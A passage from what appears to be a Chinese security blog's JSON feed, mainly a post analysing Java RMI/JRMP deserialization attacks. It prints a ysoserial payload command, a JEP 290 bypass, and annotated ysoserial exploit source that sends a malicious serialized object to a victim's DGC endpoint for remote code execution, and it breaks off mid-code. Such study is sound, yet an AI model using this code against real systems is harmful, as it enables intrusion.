class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzMyMDEwL2FydGljbGUvZGV0YWlscy8xMjA0MDIxMDI=\">Heap overflow 堆溢出（一）</span></p>\n<p>An easy HeapOverflow</p>\n",
            "tags": [
                "CTF赛题",
                "CTF_WriteUp"
            ]
        },
        {
            "id": "http://yoursite.com/Web/Java%E5%AE%89%E5%85%A8/",
            "url": "http://yoursite.com/Web/Java%E5%AE%89%E5%85%A8/",
            "title": "Java安全",
            "date_published": "2024-03-17T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"rmi安全\"><a class=\"anchor\" href=\"#rmi安全\">#</a> RMI 安全</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doYXRkYXkvYXJ0aWNsZS9kZXRhaWxzLzEwNjk3MTYzMg==\">java 反序列化 ysoserial exploit/JRMPListener 原理剖析</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doYXRkYXkvYXJ0aWNsZS9kZXRhaWxzLzEwNjk3MTUzMQ==\">java 反序列化 ysoserial exploit/JRMPClient 原理剖析</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8yMDY5Nzk4\">回顾攻击 Java RMI 方式</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vQlVUTEVSL2FydGljbGVzLzE2NDc4NDA5Lmh0bWw=\">RMI 流程</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTk3ODI5I2gzLTI=\">浅谈 Java RMI Registry 安全问题</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzkzMD90aW1lX18xMzExPW40JTJCeG5EMEcwJTNEZVFxaUlQQUtEc0EzT2hEZ0JRRDlHUVA4RG9EJmFtcDthbGljaGxncmVmPWh0dHBzJTNBJTJGJTJG\">针对 RMI 服务的九重攻击 上</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzkzMj90aW1lX18xMzExPW40JTJCeG5EMEcwJTNEZVFxaUlwcTA1JTJCYkZZaXR0aSUzRHplR2tRNEQmYW1wO2FsaWNobGdyZWY9aHR0cHMlM0ElMkYlMkZ4ei5hbGl5dW4uY29tJTJGdSUyRjIwODUx\">针对 RMI 服务的九重攻击 下</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZXNjYXBlLXcvcC8xNjEwNzY3NS5odG1s\">从 ysoserial 讲 RMI/JRMP 反序列化漏洞 </span></p>\n<p><code>RMI</code> ：远程方法调用</p>\n<p><code>JRMP</code> ：Java 远程方法协议</p>\n<p><code>JNDI</code> ：Java 命名和目录接口</p>\n<p>RMI 攻击主要分 3 种目标： <code>RMI Client</code> 、 <code>RMI Server</code> 、 <code>RMI Registry</code> ，使用远程 Reference 字节码进行攻击</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240302102149544.png\" alt=\"image-20240302102149544\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240302214407353.png\" alt=\"image-20240302214407353\" /></p>\n<h2 id=\"攻击方式\"><a class=\"anchor\" href=\"#攻击方式\">#</a> 攻击方式</h2>\n<h3 id=\"rmiregistryexploit-bind\"><a class=\"anchor\" href=\"#rmiregistryexploit-bind\">#</a> RMIRegistryExploit bind</h3>\n<p><code>RMIRegistryExploit</code>  是客户端发起 RMI 通信并发送恶意 payload 到正常注册中心（服务端），注册中心反序列化并执行恶意命令。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">java</span> <span class=\"token parameter variable\">-jar</span> ysoserial.jar JRMPListener <span class=\"token number\">127.0</span>.0.1:8888 <span class=\"token operator\">|</span> base64 <span class=\"token parameter variable\">-w</span> <span class=\"token number\">0</span></pre></td></tr></table></figure><p>Jep290 白名单策略，绕过：引入 <code>exploit.JRMPListener</code>  和 <code>payloads.JRMPClient</code></p>\n<h3 id=\"payloadsjrmplistener-exploitjrmpclient\"><a class=\"anchor\" href=\"#payloadsjrmplistener-exploitjrmpclient\">#</a> payloads.JRMPListener / exploit.JRMPClient</h3>\n<p>客户端打服务端</p>\n<p><strong> <code>payloads/JRMPLIstener</code> </strong></p>\n<ol>\n<li>发送 <code>payloads/JRMPLIstener</code>  到受害服务器，使服务器<strong>反序列化</strong>该 payload 后，会开启一个 <code>rmi</code>  服务并监听在设置的端口</li>\n<li>攻击者在自己的服务器使用 <code>exploit/JRMPClient</code>  与受害方进行通信，并且发送 <code>exp</code>  进行第二次反序列化（假如存在漏洞的服务器中有使用 <code>org.apacje.commons.collections</code>  包，则可以发送 <code>CommonsCollections</code>  系列的 payload），从而达到 RCE 的结果。</li>\n</ol>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">JRMPListener</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">PayloadRunner</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">ObjectPayload</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">UnicastRemoteObject</span><span class=\"token punctuation\">></span></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">UnicastRemoteObject</span> <span class=\"token function\">getObject</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span> command<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token comment\">// 设置 jrmp 监听端口</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">int</span> jrmpPort <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\">// 调用 RemoteObject 类的构造方法，new UnicastServerRef (jrmpPort) 作为构造方法的参数，然后返回一个 ActivationGroupImpl 类型的对象</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token class-name\">UnicastRemoteObject</span> uro <span class=\"token operator\">=</span> <span class=\"token class-name\">Reflections</span><span class=\"token punctuation\">.</span><span class=\"token function\">createWithConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ActivationGroupImpl</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">RemoteObject</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token class-name\">RemoteRef</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">new</span> <span class=\"token class-name\">UnicastServerRef</span><span class=\"token punctuation\">(</span>jrmpPort<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token comment\">// 通过反射设置 uro 对象中的 port 属性值为 jrmpPort</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token class-name\">Reflections</span><span class=\"token punctuation\">.</span><span class=\"token function\">getField</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">UnicastRemoteObject</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"port\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>uro<span class=\"token punctuation\">,</span> jrmpPort<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">return</span> uro<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>通过 <code>gadget链分析</code> ，知道生成的 payload 对象为 <code>ActivationGroupImpl</code>  类型，并将其向上转型为其父类 <code>UnicastRemoteObject</code>  类型，同时也测试此处 <code>rmi</code>  监听不能用 <code>RMIRegistryExploit</code>  攻击，该方法通过 bind 方法绑定恶意 payload 进行攻击，攻击无效</p>\n<p><strong>exploit/JRMPClient</strong>：通过 DGC 通信进行攻击</p>\n<p><code>main方法</code></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">void</span> main <span class=\"token punctuation\">(</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> args<span class=\"token punctuation\">.</span>length <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">JRMPClient</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\" &lt;host> &lt;port> &lt;payload_type> &lt;payload_arg>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span><span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\">// 生成指定的命令执行的 payload</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token class-name\">Object</span> payloadObject <span class=\"token operator\">=</span> <span class=\"token class-name\">Utils</span><span class=\"token punctuation\">.</span><span class=\"token function\">makePayloadObject</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token class-name\">String</span> hostname <span class=\"token operator\">=</span> args<span class=\"token punctuation\">[</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">int</span> port <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">[</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"* Opening JRMP socket %s:%d\"</span><span class=\"token punctuation\">,</span> hostname<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token comment\">// 通信方法</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token function\">makeDGCCall</span><span class=\"token punctuation\">(</span>hostname<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">,</span> payloadObject<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span> <span class=\"token class-name\">Exception</span> e <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token class-name\">Utils</span><span class=\"token punctuation\">.</span><span class=\"token function\">releasePayload</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> payloadObject<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>makeDGCCall通信方法</code></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> makeDGCCall <span class=\"token punctuation\">(</span> <span class=\"token class-name\">String</span> hostname<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> port<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span> payloadObject <span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">UnknownHostException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">SocketException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\">InetSocketAddress</span> isa <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InetSocketAddress</span><span class=\"token punctuation\">(</span>hostname<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token class-name\">Socket</span> s <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token class-name\">DataOutputStream</span> dos <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token comment\">// 创建与使用 payloads/JRMPLIstener 开启监听的 rmi 服务的 Socket 通信</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            s <span class=\"token operator\">=</span> <span class=\"token class-name\">SocketFactory</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDefault</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">createSocket</span><span class=\"token punctuation\">(</span>hostname<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            s<span class=\"token punctuation\">.</span><span class=\"token function\">setKeepAlive</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            s<span class=\"token punctuation\">.</span><span class=\"token function\">setTcpNoDelay</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token comment\">// 获取 Socket 的输出流</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token class-name\">OutputStream</span> os <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">getOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token comment\">// 将输出流包装成 DataOutputStream 流对象</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            dos <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">DataOutputStream</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token comment\">// 下面发送了三组数据，是在服务端 TCPTransport 类的 handleMessages 方法调用前通信的数据</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            dos<span class=\"token punctuation\">.</span><span class=\"token function\">writeInt</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TransportConstants<span class=\"token punctuation\">.</span>Magic</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 1246907721;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            dos<span class=\"token punctuation\">.</span><span class=\"token function\">writeShort</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TransportConstants<span class=\"token punctuation\">.</span>Version</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 2</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            dos<span class=\"token punctuation\">.</span><span class=\"token function\">writeByte</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TransportConstants<span class=\"token punctuation\">.</span>SingleOpProtocol</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 76</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token comment\">// 在 TCPTransport 类的 handleMessages 方法中获取到了 80</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            dos<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TransportConstants<span class=\"token punctuation\">.</span>Call</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//80</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token comment\">// 下面依然是往服务器发送数据，但是经过了序列化处理</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token annotation punctuation\">@SuppressWarnings</span> <span class=\"token punctuation\">(</span> <span class=\"token string\">\"resource\"</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">final</span> <span class=\"token class-name\">ObjectOutputStream</span> objOut <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">MarshalOutputStream</span><span class=\"token punctuation\">(</span>dos<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token comment\">// 下面四组数据最终发到服务端是用来创建 ObjID 对象，并且值与 dgcID [0:0:0, 2] 相同</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            objOut<span class=\"token punctuation\">.</span><span class=\"token function\">writeLong</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// DGC</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            objOut<span class=\"token punctuation\">.</span><span class=\"token function\">writeInt</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            objOut<span class=\"token punctuation\">.</span><span class=\"token function\">writeLong</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            objOut<span class=\"token punctuation\">.</span><span class=\"token function\">writeShort</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token comment\">// 下面数据是在服务端每一个 dispatch 方法中获取的</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            objOut<span class=\"token punctuation\">.</span><span class=\"token function\">writeInt</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// dirty</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            objOut<span class=\"token punctuation\">.</span><span class=\"token function\">writeLong</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">669196253586618813L</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token comment\">// 前面经过那么多数据的通信，到了这里就可以发送恶意 payload 了，服务端会对其进行反序列化处理。</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            objOut<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>payloadObject<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre> </pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            os<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">finally</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> dos <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                dos<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> s <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>                s<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"payloadsjrmpclient-exploitjrmplistener\"><a class=\"anchor\" href=\"#payloadsjrmpclient-exploitjrmplistener\">#</a> payloads.JRMPClient / exploit.JRMPListener</h3>\n<p>与前面相反，<strong>服务端打客户端</strong></p>\n<ol>\n<li>攻击者在自己服务器使用 <code>exploit/JRMPListener</code>  开启一个 <code>rmi</code>  监听</li>\n<li>往受害服务器发送 <code>payloads/JRMPClient</code> ， <code>payload</code>  中已经设置了攻击者服务器 <code>ip</code>  及 <code>JRMPListener</code>  监听的端口</li>\n<li>漏洞服务器反序列化该 payload 后，会去连接攻击者开启的 <code>rmi</code>  监听，在通信过程中，攻击者服务器会发送 <code>exp</code> （假如存在漏洞的服务器中有使用 <code>org.apacje.commons.collections</code>  包，则可以发送 <code>CommonsCollections</code>  系列的 payload），从而达到 RCE。</li>\n</ol>\n<p><strong> <code>payloads/JRMPClient</code> </strong></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">Registry</span> getObject <span class=\"token punctuation\">(</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span> command <span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token class-name\">String</span> host<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">int</span> port<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token comment\">// 命令行获取 ip 值与端口值</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">int</span> sep <span class=\"token operator\">=</span> command<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token char\">':'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> sep <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            port <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">nextInt</span><span class=\"token punctuation\">(</span><span class=\"token number\">65535</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            host <span class=\"token operator\">=</span> command<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            host <span class=\"token operator\">=</span> command<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> sep<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            port <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">valueOf</span><span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span>sep <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span 